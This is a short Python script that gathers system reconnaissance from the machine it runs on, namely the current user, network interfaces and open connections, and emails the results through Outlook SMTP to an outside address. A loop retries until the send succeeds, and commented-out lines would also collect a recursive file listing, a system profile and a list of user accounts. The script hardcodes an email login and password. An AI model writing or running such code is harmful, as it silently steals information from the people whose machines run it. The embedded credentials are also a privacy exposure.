import subprocess
import smtplib

#ls = subprocess.Popen("ls -R", shell=True, stdout=subprocess.PIPE).stdout.read()
who = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE).stdout.read()
#sysPro = subprocess.Popen("system_profiler", shell=True, stdout=subprocess.PIPE).stdout.read()
ifc = subprocess.Popen("ifconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
nst =  subprocess.Popen("netstat", shell=True, stdout=subprocess.PIPE).stdout.read()
#dscl = subprocess.Popen("dscl . list /Users", shell=True, stdout=subprocess.PIPE).stdout.read()

#harvest =  who + ifc + nst + dscl + sysPro + ls

#f = open('testSubProRecon.txt','w')
#f.write(harvest)
#f.close()

body = who + ifc + nst

msg = """From: blue.berry.blades@outlook.com
To: elsmith@live.com.au
MIME-Version: 1.0
Content-type: text
Subject: test


 """
message = msg + body

while True: 
	try: 
		server = smtplib.SMTP('smtp-mail.outlook.com',587)
		server.starttls()
		server.login('blue.berry.blades@outlook.com','H0tN9nes')
		server.sendmail('blue.berry.blades@outlook.com','elsmith@live.com.au', message)
		break
	except: 
		#print("Error: unable to send email.  Trying again")
		continue
